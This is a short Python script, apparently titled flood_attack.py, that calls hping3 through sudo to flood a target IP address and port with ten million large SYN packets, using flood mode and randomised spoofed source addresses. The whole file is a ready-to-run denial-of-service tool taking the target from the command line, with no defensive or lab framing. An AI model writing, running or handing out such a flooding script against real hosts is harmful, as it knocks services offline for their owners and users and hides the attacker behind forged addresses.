import subprocess
import sys

def flood_target(target_ip, target_port):
    command = [
        "sudo", "hping3",
        "-c", "10000000",  # Number of packets to send
        "-d", "1000",      # Size of each packet
        "-S",              # Set the SYN flag
        "-p", str(target_port), # Target port number
        "--flood",         # Flood attack mode
        "--rand-source",   # Randomize source address
        target_ip          # Target IP address
    ]
    
    try:
        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)
        print("Command executed successfully:\n", result.stdout)
    except subprocess.CalledProcessError as e:
        print("An error occurred:\n", e.stderr)
    except Exception as e:
        print("An error occurred:\n", str(e))

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 flood_attack.py <target_ip> <target_port>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])

    flood_target(target_ip, target_port)

if __name__ == "__main__":
    main()
